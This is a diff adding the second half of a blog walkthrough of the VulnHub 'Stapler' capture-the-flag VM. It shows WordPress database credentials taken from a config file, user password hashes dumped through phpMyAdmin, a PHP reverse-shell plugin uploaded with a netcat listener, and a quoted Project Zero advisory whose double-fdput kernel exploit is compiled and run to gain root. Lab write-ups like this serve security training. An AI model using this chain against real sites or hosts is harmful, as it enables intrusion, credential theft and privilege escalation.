@@ -7,7 +7,6 @@ comments: false
 ---
 An Office Space themed VM [Stapler](https://www.vulnhub.com/entry/stapler-1,150/) written by [g0tmi1k](https://www.vulnhub.com/author/g0tmi1k,21/), sounded like a bunch of fun.  So I decided to get it a try.
 
---- Migrating from old Blog ---
 <!--more-->
 
 ## Description
@@ -725,3 +724,357 @@ require_once(ABSPATH . 'wp-settings.php');
 define('WP_HTTP_BLOCK_EXTERNAL', true);
 root@kali:~/evidence/stapler#
 {% endhighlight %}
+
+Excellent the exploit worked and we have the wordpress configuration file.  Of particular interest are the `DB_USER` which is `root` and `DB_PASSWORD` which is `plbkac`.  We should now be able to access the mysql database through phpMyAdmin at `https://10.0.2.7:12380/phpmyadmin/`.
+
+## phpMyAdmin
+
+Utilizing the credentials we obtained from the wordpress configuratrion we login to phpmyadmin and attempt to steal the user's passwords.  Browse to wordpress->users and export to csv.
+
+{% highlight csv %}
+root@kali:~/evidence/stapler# cat wp_users.csv
+"1","John","$P$B7889EMq/erHIuZapMB8GEizebcIy9.","john","john@red.localhost","http://localhost","2016-06-03 23:18:47",,"0","John Smith"
+"2","Elly","$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0","elly","Elly@red.localhost",,"2016-06-05 16:11:33",,"0","Elly Jones"
+"3","Peter","$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0","peter","peter@red.localhost",,"2016-06-05 16:13:16",,"0","Peter Parker"
+"4","barry","$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0","barry","barry@red.localhost",,"2016-06-05 16:14:26",,"0","Barry Atkins"
+"5","heather","$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10","heather","heather@red.localhost",,"2016-06-05 16:18:04",,"0","Heather Neville"
+"6","garry","$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1","garry","garry@red.localhost",,"2016-06-05 16:18:23",,"0","garry"
+"7","harry","$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0","harry","harry@red.localhost",,"2016-06-05 16:18:41",,"0","harry"
+"8","scott","$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1","scott","scott@red.localhost",,"2016-06-05 16:18:59",,"0","scott"
+"9","kathy","$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0","kathy","kathy@red.localhost",,"2016-06-05 16:19:14",,"0","kathy"
+"10","tim","$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0","tim","tim@red.localhost",,"2016-06-05 16:19:29",,"0","tim"
+"11","ZOE","$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1","zoe","zoe@red.localhost",,"2016-06-05 16:19:50",,"0","ZOE"
+"12","Dave","$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.","dave","dave@red.localhost",,"2016-06-05 16:20:09",,"0","Dave"
+"13","Simon","$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0","simon","simon@red.localhost",,"2016-06-05 16:20:35",,"0","Simon"
+"14","Abby","$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.","abby","abby@red.localhost",,"2016-06-05 16:20:53",,"0","Abby"
+"15","Vicki","$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131","vicki","vicki@red.localhost",,"2016-06-05 16:21:14",,"0","Vicki"
+"16","Pam","$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0","pam","pam@red.localhost",,"2016-06-05 16:42:23",,"0","Pam"
+root@kali:~/evidence/stapler#
+{% endhighlight %}
+
+On to the cracking.  Generallly the 1st user is always an administrator so we will target that hash with hashcat.
+
+{% highlight bash %}
+{% endhighlight %}
+
+Excellent, `john`'s password is `incorrect`.  Heh that's amusing.
+
+![Wordpress Admin](/img/stapler/wp-admin-login.png)
+
+After a bit of poking around, it seems we can upload plugins.  via the `Add Plugins` interface.
+
+![Wordpress Admin Plugins](/img/stapler/wp-admin-plugins.png)
+
+I modify my `php-reverse-shell.php` exploit with the proper LHOST and LPORT and upload it via the interface.  At the same time starting a local netcat listener with `nc -lvp 2222`.  Uploaded items go into `/blogblog/wp-content/uploads`.
+
+![Wordpress Backdoor Plugins](/img/stapler/wp-backdoor.png)
+
+At this point execution is simply clicking and going to the netcat listener to get shell.
+
+{% highlight bash %}
+root@kali:~/evidence/stapler# nc -lvp 2222
+listening on [any] 2222 ...
+10.0.2.7: inverse host lookup failed: Unknown host
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.7] 53406
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+ 13:57:29 up 13:37,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ pwd
+/
+$ -
+{% endhighlight %}
+
+At this point I go ahead and try LinEnum.sh and linuxprivchecker.py to find ways to become root.  Nothing apparent comes up, however checking the kernel is a different story.
+
+{% highlight bash %}
+$ uname -a
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+$ cat /etc/lsb-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
+$ -
+{% endhighlight %}
+
+{% highlight bash%}
+root@kali:~# searchsploit 4.4.0
+---------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                    |  Path
+                                                                                  | (/usr/share/exploitdb/platforms)
+---------------------------------------------------------------------------------- ----------------------------------
+PHP 4.4.0 - (mysql_connect function) Local Buffer Overflow                        | ./windows/local/1406.php
+Helpdesk Pilot Knowledge Base 4.4.0 - SQL Injection                               | ./php/webapps/10788.txt
+Foxit MobilePDF 4.4.0 iOS - Multiple Vulnerabilities                              | ./ios/webapps/35775.txt
+Comodo Backup 4.4.0.0 - NULL Pointer Dereference EOP                              | ./windows/local/35905.c
+eTouch SamePage 4.4.0.0.239 - Multiple Vulnerabilities                            | ./php/webapps/36089.txt
+Photo Manager Pro 4.4.0 iOS - File Include                                        | ./ios/webapps/36796.txt
+Photo Manager Pro 4.4.0 iOS - Code Execution                                      | ./ios/webapps/36798.txt
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - netfilter target_offset OOB Privilege  | ./linux/local/40049.c
+---------------------------------------------------------------------------------- ----------------------------------
+root@kali:~# searchsploit 16.04
+---------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                    |  Path
+                                                                                  | (/usr/share/exploitdb/platforms)
+---------------------------------------------------------------------------------- ----------------------------------
+censura 1.16.04 - (Blind SQL Injection / Cross-Site Scripting) Multiple Vulnerabi | ./php/webapps/9129.txt
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Privil | ./linux/local/39772.txt
+Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps             | ./linux/dos/39773.txt
+Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                     | ./linux/local/40054.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - netfilter target_offset OOB Privilege  | ./linux/local/40049.c
+---------------------------------------------------------------------------------- ----------------------------------
+root@kali:~# -
+{% endhighlight %}
+
+A couple possibilities there!  Looks like `40049.c`, `39772.txt` are both good choices.  Lets try 40049.c first.  If memory serves this one is actually two different pieces of code.  So we split it out into pwn.c and
+
+{% highlight bash %}
+root@kali:~/tools/LinEnum-master# head pwn.c
+/**
+ * Run ./decr first!
+ *
+ * 23/04/2016
+ * - vnik
+ */
+#include <stdio.h>
+#include <string.h>
+#include <errno.h>
+#include <unistd.h>
+root@kali:~/tools/LinEnum-master# head -n 7 pwn.c
+/**
+ * Run ./decr first!
+ *
+ * 23/04/2016
+ * - vnik
+ */
+#include <stdio.h>
+root@kali:~/tools/LinEnum-master# head -n 6 pwn.c
+/**
+ * Run ./decr first!
+ *
+ * 23/04/2016
+ * - vnik
+ */
+root@kali:~/tools/LinEnum-master# head -n 23 decr.c
+/**
+ * Ubuntu 16.04 local root exploit - netfilter target_offset OOB
+ * check_compat_entry_size_and_hooks/check_entry
+ *
+ * Tested on 4.4.0-21-generic. SMEP/SMAP bypass available in descr_v2.c
+ *
+ * Vitaly Nikolenko
+ * vnik@cyseclabs.com
+ * 23/04/2016
+ *
+ *
+ * ip_tables.ko needs to be loaded (e.g., iptables -L as root triggers
+ * automatic loading).
+ *
+ * vnik@ubuntu:~$ uname -a
+ * Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ * vnik@ubuntu:~$ gcc decr.c -m32 -O2 -o decr
+ * vnik@ubuntu:~$ gcc pwn.c -O2 -o pwn
+ * vnik@ubuntu:~$ ./decr
+ * netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
+ * [!] Decrementing the refcount. This may take a while...
+ * [!] Wait for the "Done" message (even if you'll get the prompt back).
+ * vnik@ubuntu:~$ [+] Done! Now run ./pwn
+root@kali:~/tools/LinEnum-master#
+{% endhighlight %}
+
+But... it fails to run.  Ok lets look at the other exploit.
+
+{% highlight bash %}
+root@kali:~# cat /usr/share/exploitdb/platforms/linux/local/39772.txt
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+
+In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
+kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
+unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
+These conditions are fulfilled in Ubuntu 16.04.
+
+When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
+function that touches the supplied eBPF instructions is
+replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
+map file descriptors and looks up pointers for the corresponding map files.
+This is done as follows:
+
+	/* look for pseudo eBPF instructions that access map FDs and
+	 * replace them with actual map pointers
+	 */
+	static int replace_map_fd_with_map_ptr(struct verifier_env *env)
+	{
+		struct bpf_insn *insn = env->prog->insnsi;
+		int insn_cnt = env->prog->len;
+		int i, j;
+
+		for (i = 0; i < insn_cnt; i++, insn++) {
+			[checks for bad instructions]
+
+			if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
+				struct bpf_map *map;
+				struct fd f;
+
+				[checks for bad instructions]
+
+				f = fdget(insn->imm);
+				map = __bpf_map_get(f);
+				if (IS_ERR(map)) {
+					verbose("fd %d is not pointing to valid bpf_map\n",
+						insn->imm);
+					fdput(f);
+					return PTR_ERR(map);
+				}
+
+				[...]
+			}
+		}
+		[...]
+	}
+
+
+__bpf_map_get contains the following code:
+
+/* if error is returned, fd is released.
+ * On success caller should complete fd access with matching fdput()
+ */
+struct bpf_map *__bpf_map_get(struct fd f)
+{
+	if (!f.file)
+		return ERR_PTR(-EBADF);
+	if (f.file->f_op != &bpf_map_fops) {
+		fdput(f);
+		return ERR_PTR(-EINVAL);
+	}
+
+	return f.file->private_data;
+}
+
+The problem is that when the caller supplies a file descriptor number referring
+to a struct file that is not an eBPF map, both __bpf_map_get() and
+replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
+__fget_light() detected that the file descriptor table is shared with another
+task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
+the reference count of the struct file to be over-decremented, allowing an
+attacker to create a use-after-free situation where a struct file is freed
+although there are still references to it.
+
+A simple proof of concept that causes oopses/crashes on a kernel compiled with
+memory debugging options is attached as crasher.tar.
+
+
+One way to exploit this issue is to create a writable file descriptor, start a
+write operation on it, wait for the kernel to verify the file's writability,
+then free the writable file and open a readonly file that is allocated in the
+same place before the kernel writes into the freed file, allowing an attacker
+to write data to a readonly file. By e.g. writing to /etc/crontab, root
+privileges can then be obtained.
+
+There are two problems with this approach:
+
+The attacker should ideally be able to determine whether a newly allocated
+struct file is located at the same address as the previously freed one. Linux
+provides a syscall that performs exactly this comparison for the caller:
+kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).
+
+In order to make exploitation more reliable, the attacker should be able to
+pause code execution in the kernel between the writability check of the target
+file and the actual write operation. This can be done by abusing the writev()
+syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
+read accesses, then mmap()s a file containing a struct iovec from that FUSE
+filesystem and passes the result of mmap() to writev(). (Another way to do this
+would be to use the userfaultfd() syscall.)
+
+writev() calls do_writev(), which looks up the struct file * corresponding to
+the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
+that the target file is writable, then calls do_readv_writev(), which first
+copies the struct iovec from userspace using import_iovec(), then performs the
+rest of the write operation. Because import_iovec() performs a userspace memory
+access, it may have to wait for pages to be faulted in - and in this case, it
+has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
+allowing the attacker to suspend code execution in the kernel at that point
+arbitrarily.
+
+An exploit that puts all this together is in exploit.tar. Usage:
+
+user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
+user@host:~/ebpf_mapfd_doubleput$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@host:~/ebpf_mapfd_doubleput# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
+
+This exploit was tested on a Ubuntu 16.04 Desktop system.
+
+Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7
+
+
+Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
+E-DB Mirror: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+
+root@kali:~#
+{% endhighlight %}
+
+After reading a bit we need to go to https://bugs.chromium.org/p/project-zero/issues/detail?id=808 to download the actual PoC.
+
+![double-fdput](/img/stapler/double-fdput.png)
+
+{% highlight bash %}
+$ tar -xvf exploit.tar
+tar: exploit.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+$ mv exploit.zip exploit.tar
+$ tar -xvf exploit.tar
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+$ cd ebpf_mapfd_doubleput_exploit/
+$ ./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+cd /root
+ls
+fix-wordpress.sh
+flag.txt
+issue
+python.sh
+wordpress.sql
+cat flag.txt
+~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
+                          .-'''''-.
+                          |'-----'|
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o`   o`"-.         |       |
+ .-O o `"-.o   O )_,._    |       |
+( o   O  o )--.-"`O   o"-.`'-----'`
+ '--------'  (   o  O    o)  
+              `----------`
+b6b545dc11b7a270f4bad23432190c75162c4a2b
+{% endhighlight %}
+
+## Final Thoughts
+
+Great overall challenge, really enjoyed the Web App attacks.  I know the description states there are two ways to do the attack, so I will have to give this one another go later on to find that second route.
